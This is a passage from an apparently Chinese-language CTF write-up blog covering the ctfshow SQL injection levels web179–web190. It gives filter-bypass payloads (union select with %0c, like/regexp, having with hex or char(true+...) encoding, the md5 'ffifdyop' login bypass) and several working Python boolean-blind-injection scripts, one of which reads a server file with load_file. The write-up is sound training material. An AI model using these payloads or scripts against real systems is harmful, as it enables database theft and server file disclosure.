class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>源码</p><p><img src="../images/image-20221227160433511.png" alt="image-20221227160433511"></p><p>用179的payload还能用，但是得把后面的东西去掉，也该是过滤掉了;或者是%23</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>源码</p><p><img src="../images/image-20221227160739728.png" alt="image-20221227160739728"></p><p>给了过滤项。</p><p>and的优先级高于or，需要同时满足两边的条件才会返回true，那么后面可以接一个or，or的两边有一个为true，既可以满足and。即：1 and 0 or 1</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227161951410.png" alt="image-20221227161951410"></p><p>这道题也能用%0c来做，那么就是题目给漏了。</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>源码</p><p><img src="../images/image-20221227162638001.png" alt="image-20221227162638001"></p><p>多过滤了个flag</p><p>%  —-&gt;相当于*，任意匹配</p><p>_   ——-&gt;相当于？，只能匹配一个字符</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;%fla%</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227162805178.png" alt="image-20221227162805178"></p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>源码</p><p><img src="../images/image-20221227174007597.png" alt="image-20221227174007597"></p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a>   摘自这篇博客</p><p>解答：waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p><p>select不能用，就只能选择布尔盲注或者时间盲注了。</p><p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p><p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count = 1;，可以用布尔盲注。</p><p>题目这里可以行得通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>regexp</code>这个是正则匹配的意思。</p><p><img src="../images/image-20221227182656859.png" alt="image-20221227182656859"></p><p>利用脚本就可以跑完了，就是跑的会有点久。</p><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>源码</p><p><img src="../images/image-20221227183934675.png" alt="image-20221227183934675"></p><p>着里是把where和单双引号都给过滤掉了，那么我们就得去利用16进制给绕过，where被过滤的话可以使用having进行绕过，但是having有使用条件.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://77ccea0a-ea21-463d-bd36-c3517890ddcd.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a= <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="keyword">return</span> a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(0x63746673686f77&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(str2hex(flag+x))</span><br><span class="line">                <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url,data=data)</span><br><span class="line">            <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                flag+=x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">      main()</span><br></pre></td></tr></table></figure><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>源码</p><p><img src="../images/image-20221229192109344.png" alt="image-20221229192109344"></p><p>这题是把<strong>数字  where 单双引号</strong> 给过滤掉了，那么我们就得想办法构造字符了。</p><p><img src="../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"></p><p>就是利用这个东西来构造字符串，但是我们得需要一个函数来把这些构造出来的东西给连接起来。</p><p><img src="../images/1a58fc8b87484af9952dbcf4f65e90e1.png" alt="img"></p><p>本地测试了一下，发现确实可以。</p><p><img src="../images/image-20221229214124144.png" alt="image-20221229214124144"></p><p>以下脚本摘自这篇文章   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(formatString(&quot;0x63746673686f777b&quot;))</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="comment">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span></span><br><span class="line">dic=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[**] &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[flag]:&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是群主写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-01-12 01:16:02</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 03:50:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒发送不超过5个请求</span></span><br><span class="line"><span class="comment"># mysql 官方文档 https://dev.mysql.com/doc/refman/5.7/en/replication.html 5.7版本的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f279fb00-070d-4b47-a72f-0f1a82f2e84a.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"><span class="comment">#flagstr = &quot;&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span>+a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686f777b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;concat(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">temp +=char2boolean(x)</span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char2boolean</span>(<span class="params">ch</span>):</span><br><span class="line">num = <span class="built_in">ord</span>(ch)</span><br><span class="line">temp = <span class="string">&quot;char(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">temp +=<span class="string">&quot;true+&quot;</span></span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;),&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;55eff0b8-fa84-4ee8-9cd2-4e84cdd78b73&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">flag=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20221229221701321.png" alt="image-20221229221701321"></p><p>代码中的char是负责转换字符用的，然后concat是连接字符用的。char转换里的内容是ascii的10进制。</p><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>源码</p><p><img src="../images/image-20221229221947989.png" alt="image-20221229221947989"></p><p>这道题多过滤了&lt;&gt;  和x00  但是还是可以上一题的脚本来写。</p><p><img src="../images/image-20221229222842518.png" alt="image-20221229222842518"></p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>源码</p><p><img src="../images/image-20221229222936006.png" alt="image-20221229222936006"></p><p><img src="../images/image-20221229224301702.png" alt="image-20221229224301702"></p><p>以下内容摘自   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>​           本题和web181类似，都是通过<code>1 and 0 or 1</code>达到目的。</p><p>​         这里的二进制格式，并不是指转成0101，而是binary mode。</p><p><img src="../images/image-20221229224630236.png" alt="image-20221229224630236"></p><p><img src="../images/image-20221229224640893.png" alt="image-20221229224640893"></p><p>就是这样的格式。</p><p>那么这道题就得用到这个经过md5(<strong>ffifdyop</strong>)加密过后的东西，里面这段英文解析之后就是上图所示，和万能密码差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6�]��!r,��b&#x27;;</span><br></pre></td></tr></table></figure><p>这个就会变成1 and 0 or 1   的情况，那么最后结果就是  1。</p><p><img src="../images/image-20221229225158366.png" alt="image-20221229225158366"></p><p><img src="../images/image-20221229225309316.png" alt="image-20221229225309316"></p><p>就是类似这种效果。只要第一个数字是数字不是字母就行。</p><p><img src="../images/image-20221229225514311.png" alt="image-20221229225514311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(*)  ----&gt;指的是数据库总行数</span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>源码</p><p><img src="../images/image-20221229230058797.png" alt="image-20221229230058797"></p><p><strong>这里的考法是mysql的弱类型比较。</strong></p><p><img src="../images/image-20221229230659047.png" alt="image-20221229230659047"></p><p><img src="../images/image-20221229230716625.png" alt="image-20221229230716625"></p><p>这里能爆出来的原因是因为username的值没有用  ‘’   包含起来，那么username的值就为0，数据库中username是字母开头的话，值也为0.那么就可以把这些全部给爆出来了。</p><p><img src="../images/image-20221229230926512.png" alt="image-20221229230926512"></p><p>这个能爆出的原因是这个的username为1ab，转换过来的话值是为1的。那么就可以爆出值为1的password.</p><p><img src="../images/image-20221229231221101.png" alt="image-20221229231221101"></p><p>username和password都用0的原因是，两个if判断都为弱类型比较，<strong>0都会等于字母开头的字符串</strong></p><p>就是利用这一点，拿到了flag。</p><h2 id="web189-bool盲注"><a href="#web189-bool盲注" class="headerlink" title="web189(bool盲注)"></a>web189(bool盲注)</h2><p>源码</p><p><img src="../images/image-20221229231806534.png" alt="image-20221229231806534"></p><p>和上一题的内容一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在api/index.php文件中     ----&gt;  给的提示</span><br></pre></td></tr></table></figure><p>看一下登录的返回情况有没有差别：<br>username=0、password=0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username=1、password=0时，返回“查询失败”。（说明用户不存在）</p><p>因为输入0  和 1返回的结果不同，加上过滤了联合注入需要的东西，那么我们就得考虑bool盲注的问题了。</p><p><strong>群主写的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个位置，是群主耗费很长时间跑出来的位置~</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="built_in">format</span>(i,x),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;8d25&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#8d25是username等于1时返回的东西，0返回时的东西不是8d25.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>data里的意思是，如果返回的值里的第n位与字符串里的某位相等，则返回1</p><p><img src="../images/image-20221230165849922.png" alt="image-20221230165849922"></p><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>源码</p><p><img src="../images/image-20221230205113908.png" alt="image-20221230205113908"></p><p>这道题给了个提示说是bool盲注</p><p><img src="../images/image-20221230205237454.png" alt="image-20221230205237454"></p><p>提示密码错误。</p><p><img src="../images/image-20221230205303277.png" alt="image-20221230205303277"></p><p>输入别的提示用户名不存在，所以可以得出用户名处存在sql注入。这题没有过滤字符，那么直接用群主写的二分法脚本来跑就行了。(以后遇到bool盲注的题，可以修改脚本一下直接用就行了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 